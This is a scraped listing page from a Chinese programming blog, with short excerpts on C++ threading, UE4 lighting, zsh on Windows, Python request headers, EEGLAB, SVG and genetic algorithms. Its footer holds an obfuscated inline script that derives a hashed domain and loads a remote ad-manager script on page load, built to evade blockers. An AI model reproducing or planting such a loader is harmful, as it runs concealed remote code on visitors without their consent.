	<div class="content list__excerpt post__content clearfix">
		本文使用独占锁、原子类型、条件变量，实现线程间同步，API接口模仿Go语言中的 WaitGroup
#ifndef __WAITGROUP_H_ #define __WAITGROUP_H_ #include &lt;mutex&gt; #include &lt;atomic&gt; #include &lt;condition_variable&gt; namespace algo { class WaitGroup { public: WaitGroup() { m_counter = 0; } void Add(int count = 1) { m_counter += count; } void Done() { m_counter--; if (m_counter.load() &lt;= 0) { m_cond.notify_all(); } } int GetCount() { return m_counter.load(); } void Wait() { if (m_counter.load() &lt;= 0) { return; } std::unique_lock&lt;std::mutex&gt; lock(m_mutex); m_cond.wait(lock, [&amp;]() { return this-&gt;m_counter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98976ac31379e85a63a73f5802b0b9af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1766164fbccf4734c5fe792512c86f3a/" rel="bookmark">
			QT 无法输入中文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载于这位博主：文章
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cda74f65329fc03808fa51c71b31b2e5/" rel="bookmark">
			03_ue4进阶_光照
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		思想：光拉的好，才能发挥材质的美感。
每个光都分为三种类型静：静态、半动态，动态
在这里额外提个小妙招，如何让物体与地面平齐
那就是按住z轴，按end键。
删掉围墙，我们先盖个房子。
拉进来一个立方体
将xyz分别调成20，0.25，10
按住z轴和end键，落地
从上部看，按alt来复制墙
通过对墙体的复制和缩放形成三个墙体，形成了一个门
再复制一个墙，来当天花板。
把小灯放在地上
加一个聚光源在上面
现在有个问题是，房子搭好了，为什么房子不暗呢，这是由于天光的原因，他起到了一个全局光照（不分遮挡）作用。
我们把skylight的这个强度范围调整一下，做个对比
5的时候
0.5 的时候
将强度范围设为0，发现屋里彻底暗了。 在火炉里面加个点光源，看效果
静态光源（半动态光源）的使用需要烘焙：将光附加到附近的材质上，这样开启游戏的时候就不用实时计算光强了，节省游戏开销，烘焙之后才能显现出静态光的效果。（局部光不建议都调成动态的）
调节光源的色调。
调整点光源的范围。
现在我们将点光源设为静态光源。
左上角会显示有物体没有构建
首先修改光的构建质量，我们设为质量高 开始烘焙
效果
增加聚光源强度
还是把灯挂起来，比较舒服
构建光照，效果
这是光照到物体时，光线的反射，数字越大，反射越大，房间越亮。
现在有个问题是，静态光烘焙之后没有，小白人过去，并没有留下影子。
半静态的光就派上了用场。
我们将这两个光都改成固定。
然后构建，效果：
总结：太阳设为动态光，局部光源设为半动态的光来烘焙。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/136e9ab3aa8cce3192236c0e3e705790/" rel="bookmark">
			第一章 数字图像基础知识（图像的空间分辨率和幅度分辨率）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 图像的空间分辨率和幅度分辨率 1、空间分辨率 是每英寸图像内有多少个像素点，分辨率的单位为PPI(Pixels Per Inch)，通常叫做：像素每英寸。
采样频率越高空间分配率就越大。
对图像的影响： 保持空间率不变
一幅数字化后的图像其总数据量是：
每行像素（M）X 每列像素数（N）X 灰度值所占用位数（Bits）。
3、空间分辨率和幅度分辨率同时发生发改变对图像的影响 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/049e0867315cbf340c1a2f5e79f15a9f/" rel="bookmark">
			Windows在git-bash安装zsh
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 博主现在已经转 mac 用户。但是因为家里的台式机是是 win 装黑果遇到各种问题，最终还是放弃在家使用 mac 环境。
但是又用习惯了 zsh 的各种插件。所以开始琢磨如何在 win 中使用一套舒适的环境。
最开始我是使用 wsl 中的 linux 环境安装 zsh。但毕竟属于子系统，很多环境是不共享。因为我是一名前端工程师，当做桌面程序开发的时候。在 wsl 需要另外配一套环境启动。
后面在 google 查阅之后。发现 git-bash 中安装 zsh 即可在大多环境与 window 共享的前提下使用 zsh 的生态。
安装 git-bash https://git-scm.com/downloads
安装这个没什么好说的，按照提示点击下一步操作。如果不知道怎么配置，全部默认即可。
打开后是类似这个样子
下载 zsh 的包 https://packages.msys2.org/package/zsh?repo=msys&amp;variant=x86_64
下载 zsh-5.8-5-x86_64.pkg.tar.zst 文件。5.8-5 是版本号，当你看到这配文章的时候版本号可能已经发生改变，所以你只需要下载 zsh-xxx-x86_64.pkg.tar.zst 即可。
解压 zsh 压缩文件 这里推荐使用 https://peazip.github.io/ 进行解压。当然如果你有其他的解压工具能解压也行。
解压后你的文件中应该包含 etc 和 usr 类似字眼。将解压出来的所有文件，包含刚刚说的文件。复制到 git-bash 安装的根目录。可能会提示冲突，选择覆盖文件即可。
安装 oh-my-zsh 如果你跟我一样，决定默认使用 zsh。而不进入 bash。可以在 .bashrc 加上下面代码。
if [ -t 1 ]; then exec zsh fi 在终端输入下面指令。进入 zsh
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/049e0867315cbf340c1a2f5e79f15a9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6251c71aa323bbe69091987a04a3816e/" rel="bookmark">
			Python爬虫requests模块在线生成请求头
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 写爬虫的时候，请求头几乎是必写的，但是写起来有点繁琐，虽然不难，但是麻烦，所以这时候，一个自动生成请求头的方法就显得很重要了
在线生成请求头 https://curlconverter.com/
使用方法 快速一键生成Python爬虫请求头
import requests headers = { 'authority': 'curlconverter.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6', 'cache-control': 'max-age=0', 'if-modified-since': 'Fri, 15 Jul 2022 21:44:42 GMT', 'if-none-match': 'W/"62d1dfca-3a58"', 'referer': 'https://link.csdn.net/?target=https%3A%2F%2Fcurlconverter.com%2F', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Microsoft Edge";v="102"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'cross-site', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30', } response = requests.get('https://curlconverter.com/', headers=headers) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9005bb498de8c1730a8f947421d39d6/" rel="bookmark">
			火狐安装低版本hackbar插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在火狐安装的最新版hackbar插件无法使用，需要付费的许可证。
可以使用旧版本的HackBar
HackBar2.1.3版本下载地址：https://github.com/Mr-xn/hackbar2.1.3
下载最后一个文件。
首先移除之前安装的hackbar，再在浏览器的拓展与主题中手动安装HackBar2.1.3版本
用f12验证可以正常使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86fc8f695c8ffbffb46202341393921d/" rel="bookmark">
			eeglab绘制脑电头皮图、通道对应光谱图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.绘制脑电头皮图
在上一篇文章中导入脑电数据的基础上，我们在eeglab plot的界面选择：Edit-&gt;Channel locations选择配置通道位置文件。如果导入的数据为Neuroscan或BioSemi格式，则通道位置不需要配置，已经包含在数据集中。
调用通道编辑窗口时，如图下所示：
选择第二个模板，表示执行本地源，使用MNI坐标点击OK出现一下界面：
在这里我们导入事先准备好的通道文件，同时，点击Read locs help按钮可以查看这里支持的通道文件格式：
the file extension determines its type. '.loc' or '.locs' or '.eloc': polar coordinates. Notes: angles in degrees: right ear is 90; left ear -90; head disk radius is 0.5. Fields: N angle radius label Sample: 1 -18 .511 Fp1 2 18 .511 Fp2 3 -90 .256 C3 4 90 .256 C4 ... Note: In previous releases, channel labels had to contain exactly four characters (spaces replaced by '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86fc8f695c8ffbffb46202341393921d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74d1bec8675e78bb5af3cbc79b2da829/" rel="bookmark">
			eeglab加载显示脑电数据，eeglab简单操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.运行egglab：
eeglab 在Matlab命令行运行eeglab得到如下界面：
2.加载数据：
在eeglab界面上选择file-&gt;Load existing dataset 后弹出下面框，并进行测试文件的选择：
选择改文件后，出现下面界面：
选择Edit-&gt;event values后显示观察事件值，在该数据集中包含154个事件，每个事件指定了EEG.event结构字段类型、position（位置）和latency（延迟）。可以使用&gt;、&lt;、&lt;&lt;、&gt;&gt;按键进行前后选择，在改实验中，有两种类型的事件”square“和”rt“。”square“事件对应的是显示器中绿色正方形的外观，”rt“对应于受试者的反应时间。如下图：
3.查看数据信息
选择Edit-&gt;About this dataset,结果如下图：
4.浏览EEG通道数据（可视化）
本数据文件包含连续的脑电数据,实际上是将80个独立的3秒数据段来构建的。因此在某些数据通道中可能会存在一些跳变。选择Plot-&gt;Channel data(scroll)。绘图窗口右侧是垂直刻度值以及单位：微伏，表示垂直刻度条的“幅度”。在该数据文件下为80微伏，右下角可以对齐进行修改。
点击“+”、“-”按钮或通过键盘编辑文本值，将刻度值更改后按Enter键滚动窗口。
调整滚动窗口的宽度，在上述界面中选择Settings-&gt;Time range to display，出现如下界面：
点击OK，将显示区域扩大到10的长度，结果如下：
编辑通道数量，在eeglab()界面中，选择Settings-&gt;Number of channels to display，出现如下界面：
更改数据为16，显示16通道的数据，点击OK，结果如下图：
通过Settings -&gt;Zoom off/on控制是否可以使用鼠标对图像进行缩放，在数据区域周围拖动一个矩形放大它，单击鼠标右键再次缩小。
通过Display-&gt;Grid-&gt;X/Y grid on来绘制水平线，重复设置可取消画线。
数据：链接：https://pan.baidu.com/s/1xe9WLDXoSZgXzW9eCV-bkg
提取码：yayn
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/995aaf510f235d83e3a58c43790aa06b/" rel="bookmark">
			学习SVG（二）坐标系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 SVG是用于绘图的，那么它和其他绘图技术一样都是有网格坐标系统。坐标系简介：
以左上角为坐标系的原点(0,0)。X 轴的正方向向右，Y 轴的正方向向下。坐标轴以像数为单位。 viewport 视口 视口是指文档在HTML使用的画布区域。由 width、height 属性确定视口的大小。如果 SVG 元素不声明 viewport，浏览器会默认给定视口的大小 300px * 150px。 &lt;svg version="1.1" xmlns="http://www.w3.org/2000/svg" baseProfile="full"&gt; &lt;rect width="100%" height="100%" stroke="#FF5151" stroke-width="4" fill="#FF8EFF" /&gt; &lt;circle cx="150" cy="100" r="80" fill="#BE77FF" /&gt; &lt;text x="150" y="110" font-size="16" text-anchor="middle" fill="white"&gt;你好&lt;/text&gt; &lt;/svg&gt; viewbox 画布中的可视区。简单理解就是只在视口中绘制可视区范围内的内容。viewBox 接收四个参数值，分别是 min-x，min-y，width，height。min-x 和 min-y 设置可视区在视口中的位置(可视区的左上角)，width 和 height 设置可视区的宽和高。注意 width 或 height 如果设置成 0 ，就代表没有可视区。初始viewBox的范围和viewport完全相同。 示例，设置viewBox="0 0 100 100"。 &lt;svg version="1.1" xmlns="http://www.w3.org/2000/svg" baseProfile="full" width="300" height="200" viewBox="0 0 100 100"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/995aaf510f235d83e3a58c43790aa06b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aced1c40c584fdb514ec86da220b2c2e/" rel="bookmark">
			遗传算法系列 | 多种群遗传算法(matlab)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多种群遗传算法 MPGA 本文是作者遗传算法系列之篇四，前面已经系统地讲解了遗传算法基本原理以及简单应用
系列一 —— 标准遗传算法原理及程序实现
系列二 —— 遗传算法应用于TSP问题
系列三 —— 遗传算法应用于车辆路径规划
不难发现，虽然遗传算法在一些简单问题上效果不错，但面对复杂的多模态函数时，常常发生早熟（未成熟收敛），也就是群体中所有个体都趋于同一状态而停止进化。
多种群遗传算法正是应对此问题的方法之一，下面将从理论原理、算法流程以及程序实现上进行详细展开。
00 目录 理论概述
算法流程
问题导入
MATLAB程序实现
展望
01 理论概述 多种群遗传算法（multiple population GA，MPGA）与标准遗传算法(SGA)的基础上主要引入了以下几个概念：
突破遗传算法仅靠单个群体进行遗传算法进化的框架，引入多个种群同时进行优化搜索；不同的种群赋予不同的控制参数，实现不同的搜索目的。各个种群之间通过移民算子进行联系，实现多种群的协同进化；最优解的获取是多个种群协同进化的综合结果。通过人工选择算子保存各种群每个进化代中 的最优个体，并作为判断算法收敛的依据。 具体来说
各种群取不同的控制参数，MPGA弥补了SGA依赖于交叉算子Pc、变异算子Pm的缺陷，通过设有不同控制参数的种群协同进化，从而兼顾算法的全局搜索和局部搜索。
各种群相对独立，种群交互通过移民算子联系。移民算子将各种群的最优个体定期引入其它种群中，实现种群之间的信息交换，这也是MPGA的特点所在。
精华种群和其它种群不同，每一代进化后，通过人工选择算子选出种群的最优个体放入精华种群，并且精华种群不进行选择、交叉、变异等操作，保证进化过程中最优个体不被破坏和丢失，并且精华种群的最优个体最少保持代数将作为算法终止判据，该判据充分利用了遗传算法在进化中的知识积累，较之最大遗传代数更为合理。
02 算法流程 算法流程与标准遗传算法相比，主要多出了移民和人工选择的操作，并且收敛条件也作了改变，MPGA流程图如下：
03 问题导入 3.1 问题描述 采用复杂的二元函数求最值问题，函数如下：
约束为：
该函数的图像如下所示：
可以看出，该函数在取值范围内有大量局部极值，通常的寻优算法很容易陷入局部极值中或在极值间振荡，因此对于检验多种群遗传算法的性能是比较合适的。
3.2实验设计 为显示多种群遗传算法较之标准遗传算法的优越性，本文针对该函数，分别对两种算法做仿真对比，并分别独立运行4次观察其进化过程。
对于SGA部分，采用英国谢菲尔德大学推出的遗传算法工具箱，该工具箱在作者往期文章中可获取下载链接；（遗传算法工具箱地址）
对于MPGA部分，其主体部分和SGA大致相似，因此本文将重点介绍移民算子和人工选择算子的实现。
04 MATLAB程序实现 4.1 移民算子 该函数的代码如下
其中
输入参数的 Chrom 是移民前种群的编码， ObjV 是种群个体的适应度；
输出参数的 Chrom 是移民后种群的编码， ObjV 是种群个体的适应度。
移民算子的主要目的是将某一种群的优秀个体移到其它种群中
在此思想下，该段代码的思路：
获取种群数；遍历每个种群，找到当前种群的最优个体以及目标种群的最劣个体；将当前种群的最优个体替换到目标种群最劣个体位置；更新适应度结束 4.2 人工选择算子 该函数的代码如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aced1c40c584fdb514ec86da220b2c2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90e3f50b89f04b55ec73ba33ee8fabd4/" rel="bookmark">
			git extensions linux工具(sh)未发现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. git extensions linux工具(sh)未发现，
当你遇到下述问题时，如在windows上，请按照如下操作：
2. 设置git的路径即可：
3. 设置一些基本配置，比如compare的设置，及其参数
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/249/">«</a>
	<span class="pagination__item pagination__item--current">250/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/251/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>